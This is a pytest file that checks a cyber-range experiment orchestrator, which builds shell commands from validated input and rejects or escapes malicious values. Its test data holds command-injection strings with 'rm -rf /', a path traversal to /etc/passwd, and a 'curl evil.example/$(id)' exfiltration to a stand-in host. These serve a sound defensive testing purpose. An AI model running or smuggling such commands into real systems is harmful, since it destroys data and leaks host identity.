"""Integration tests for orchestrator's use of ScriptExecutionContext.

These tests pin the orchestrator-level contract: every command string
constructed by `_build_execution_plan` must come from a validated
`cyberscript.script_context.ScriptExecutionContext`. Bad inputs surface as
`ExecutionPlanError`, never as a raw `ValidationError` or as silently-bad
shell text.
"""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from cms.experiments.exceptions import ExecutionPlanError
from cms.experiments.orchestrator import ExperimentOrchestrator


def _make_experiment(**overrides):
    exp = MagicMock()
    exp.pk = overrides.get("pk", 1)
    return exp


def _make_run(**overrides):
    run = MagicMock()
    run.pk = overrides.get("pk", 100)
    run.experiment_id = 1
    return run


def _make_script_assignment(
    instance_name: str,
    script_type: str = "python",
    s3_key: str | None = "scripts/1/x.py",
    claude_prompt: str | None = None,
    execution_order: int = 10,
):
    sa = MagicMock()
    sa.instance_name = instance_name
    sa.script_type = script_type
    sa.execution_order = execution_order
    if script_type == "python":
        sa.script = MagicMock()
        sa.script.s3_key = s3_key
        sa.claude_prompt = None
    else:
        sa.script = None
        sa.claude_prompt = claude_prompt or "do the thing"
    return sa


class TestPythonCommandSafety:
    """Python-script rendering must read every dynamic segment off the validated context."""

    def test_uses_instance_id_for_path_not_name(self):
        exp = _make_experiment()
        run = _make_run()
        sa = _make_script_assignment("Workstation 1", "python", "scripts/1/script.py")

        with (
            patch("cms.experiments.orchestrator.Experiment") as MockExp,
            patch("cms.experiments.orchestrator.ExperimentScript") as MockScript,
        ):
            prefetch = MagicMock()
            prefetch.get.return_value = exp
            MockExp.objects.prefetch_related.return_value = prefetch
            qs = MagicMock()
            qs.select_related.return_value.order_by.return_value = [sa]
            MockScript.objects.filter.return_value = qs

            orch = ExperimentOrchestrator(experiment_id=1)
            provisioned = {
                "Workstation 1": {"instance_id": "i-0abcdef12", "private_ip": "10.0.0.5"},
            }
            plan = orch._build_execution_plan(run, provisioned)

        assert len(plan.victim_commands) == 1
        cmd = plan.victim_commands[0].command
        assert "Workstation 1" not in cmd, "display name must not reach shell text"
        # S108 false positives: these are string assertions on generated shell
        # text, not actual file operations from this test.
        assert "/tmp/script_i-0abcdef12.py" in cmd  # noqa: S108
        assert "/tmp/output_i-0abcdef12.log" in cmd  # noqa: S108

    def test_rejects_malformed_instance_id(self):
        exp = _make_experiment()
        run = _make_run()
        sa = _make_script_assignment("Workstation", "python", "scripts/1/script.py")

        with (
            patch("cms.experiments.orchestrator.Experiment") as MockExp,
            patch("cms.experiments.orchestrator.ExperimentScript") as MockScript,
        ):
            prefetch = MagicMock()
            prefetch.get.return_value = exp
            MockExp.objects.prefetch_related.return_value = prefetch
            qs = MagicMock()
            qs.select_related.return_value.order_by.return_value = [sa]
            MockScript.objects.filter.return_value = qs

            orch = ExperimentOrchestrator(experiment_id=1)
            provisioned = {
                "Workstation": {"instance_id": "i-evil; rm -rf /"},
            }
            with pytest.raises(ExecutionPlanError) as exc:
                orch._build_execution_plan(run, provisioned)
        assert "instance_id" in str(exc.value)

    def test_rejects_traversal_in_s3_key(self):
        exp = _make_experiment()
        run = _make_run()
        sa = _make_script_assignment("Workstation", "python", "scripts/../../etc/passwd")

        with (
            patch("cms.experiments.orchestrator.Experiment") as MockExp,
            patch("cms.experiments.orchestrator.ExperimentScript") as MockScript,
        ):
            prefetch = MagicMock()
            prefetch.get.return_value = exp
            MockExp.objects.prefetch_related.return_value = prefetch
            qs = MagicMock()
            qs.select_related.return_value.order_by.return_value = [sa]
            MockScript.objects.filter.return_value = qs

            orch = ExperimentOrchestrator(experiment_id=1)
            provisioned = {
                "Workstation": {"instance_id": "i-0abcdef12"},
            }
            with pytest.raises(ExecutionPlanError) as exc:
                orch._build_execution_plan(run, provisioned)
        assert "script_s3_key" in str(exc.value)

    def test_rejects_malformed_private_ip(self):
        """Bad private_ip in provisioned_instances must surface as ExecutionPlanError.

        Regression guard: the orchestrator must read the `private_ip` key
        (not `ip`) so the IPv4 validator actually fires.
        """
        exp = _make_experiment()
        run = _make_run()
        sa = _make_script_assignment("Workstation", "python", "scripts/1/script.py")

        with (
            patch("cms.experiments.orchestrator.Experiment") as MockExp,
            patch("cms.experiments.orchestrator.ExperimentScript") as MockScript,
        ):
            prefetch = MagicMock()
            prefetch.get.return_value = exp
            MockExp.objects.prefetch_related.return_value = prefetch
            qs = MagicMock()
            qs.select_related.return_value.order_by.return_value = [sa]
            MockScript.objects.filter.return_value = qs

            orch = ExperimentOrchestrator(experiment_id=1)
            provisioned = {
                "Workstation": {
                    "instance_id": "i-0abcdef12",
                    "private_ip": "999.0.0.1",  # out-of-range octet
                },
            }
            with pytest.raises(ExecutionPlanError) as exc:
                orch._build_execution_plan(run, provisioned)
        assert "private_ip" in str(exc.value)

    def test_rejects_shell_metas_in_s3_key(self):
        exp = _make_experiment()
        run = _make_run()
        sa = _make_script_assignment("Workstation", "python", "scripts/1/x.py; curl evil.example/$(id)")

        with (
            patch("cms.experiments.orchestrator.Experiment") as MockExp,
            patch("cms.experiments.orchestrator.ExperimentScript") as MockScript,
        ):
            prefetch = MagicMock()
            prefetch.get.return_value = exp
            MockExp.objects.prefetch_related.return_value = prefetch
            qs = MagicMock()
            qs.select_related.return_value.order_by.return_value = [sa]
            MockScript.objects.filter.return_value = qs

            orch = ExperimentOrchestrator(experiment_id=1)
            provisioned = {
                "Workstation": {"instance_id": "i-0abcdef12"},
            }
            with pytest.raises(ExecutionPlanError):
                orch._build_execution_plan(run, provisioned)


class TestClaudeCommandSafety:
    """Claude-prompt rendering must resolve templates via the context, then encode."""

    def test_resolves_and_renders_prompt(self):
        exp = _make_experiment()
        run = _make_run()
        sa = _make_script_assignment(
            "Workstation",
            script_type="claude_code",
            claude_prompt="Attack the box at {{Workstation.ip}}",
        )

        with (
            patch("cms.experiments.orchestrator.Experiment") as MockExp,
            patch("cms.experiments.orchestrator.ExperimentScript") as MockScript,
        ):
            prefetch = MagicMock()
            prefetch.get.return_value = exp
            MockExp.objects.prefetch_related.return_value = prefetch
            qs = MagicMock()
            qs.select_related.return_value.order_by.return_value = [sa]
            MockScript.objects.filter.return_value = qs

            orch = ExperimentOrchestrator(experiment_id=1)
            provisioned = {
                "Workstation": {"instance_id": "i-0abcdef12", "private_ip": "10.0.0.5"},
            }
            plan = orch._build_execution_plan(run, provisioned)

        cmd = plan.victim_commands[0].command
        assert "-p 'Attack the box at 10.0.0.5'" in cmd

    def test_validation_error_does_not_leak_raw_prompt(self):
        """Pydantic's default str() includes input_value; orchestrator must strip it."""
        exp = _make_experiment()
        run = _make_run()
        # Distinctive sentinel substring that would land in the error message
        # if the orchestrator naively stringified the ValidationError.
        sentinel = "THIS_RAW_PROMPT_MUST_NOT_LEAK_INTO_LOGS"
        sa = _make_script_assignment(
            "Workstation",
            script_type="claude_code",
            claude_prompt=f"{sentinel} {{{{Ghost.ip}}}}",
        )

        with (
            patch("cms.experiments.orchestrator.Experiment") as MockExp,
            patch("cms.experiments.orchestrator.ExperimentScript") as MockScript,
        ):
            prefetch = MagicMock()
            prefetch.get.return_value = exp
            MockExp.objects.prefetch_related.return_value = prefetch
            qs = MagicMock()
            qs.select_related.return_value.order_by.return_value = [sa]
            MockScript.objects.filter.return_value = qs

            orch = ExperimentOrchestrator(experiment_id=1)
            provisioned = {
                "Workstation": {"instance_id": "i-0abcdef12", "private_ip": "10.0.0.5"},
            }
            with pytest.raises(ExecutionPlanError) as exc:
                orch._build_execution_plan(run, provisioned)
        assert sentinel not in str(exc.value), "raw prompt body must not appear in the ExecutionPlanError message"

    def test_unknown_instance_in_template_surfaces_as_execution_plan_error(self):
        exp = _make_experiment()
        run = _make_run()
        sa = _make_script_assignment(
            "Workstation",
            script_type="claude_code",
            claude_prompt="hit {{Ghost.ip}}",
        )

        with (
            patch("cms.experiments.orchestrator.Experiment") as MockExp,
            patch("cms.experiments.orchestrator.ExperimentScript") as MockScript,
        ):
            prefetch = MagicMock()
            prefetch.get.return_value = exp
            MockExp.objects.prefetch_related.return_value = prefetch
            qs = MagicMock()
            qs.select_related.return_value.order_by.return_value = [sa]
            MockScript.objects.filter.return_value = qs

            orch = ExperimentOrchestrator(experiment_id=1)
            provisioned = {
                "Workstation": {"instance_id": "i-0abcdef12", "private_ip": "10.0.0.5"},
            }
            with pytest.raises(ExecutionPlanError) as exc:
                orch._build_execution_plan(run, provisioned)
        assert "claude_prompt_template" in str(exc.value)

    def test_quoted_metacharacters_survive_inside_single_quoted_arg(self):
        """`'; rm -rf /; echo '` in the prompt must not break out of the `-p '…'` arg."""
        exp = _make_experiment()
        run = _make_run()
        sa = _make_script_assignment(
            "Workstation",
            script_type="claude_code",
            claude_prompt="'; rm -rf /; echo '",
        )

        with (
            patch("cms.experiments.orchestrator.Experiment") as MockExp,
            patch("cms.experiments.orchestrator.ExperimentScript") as MockScript,
        ):
            prefetch = MagicMock()
            prefetch.get.return_value = exp
            MockExp.objects.prefetch_related.return_value = prefetch
            qs = MagicMock()
            qs.select_related.return_value.order_by.return_value = [sa]
            MockScript.objects.filter.return_value = qs

            orch = ExperimentOrchestrator(experiment_id=1)
            provisioned = {
                "Workstation": {"instance_id": "i-0abcdef12"},
            }
            plan = orch._build_execution_plan(run, provisioned)

        cmd = plan.victim_commands[0].command
        # The argument is wrapped: -p '<encoded>' …
        between = cmd.split(" -p '", 1)[1].split("' 2>&1 ", 1)[0]
        # Every bare `'` in the argument body must be part of a `'\''` sequence.
        # Replace every `'\''` with a sentinel; no `'` should remain.
        assert "'" not in between.replace("'\\''", "\x01")
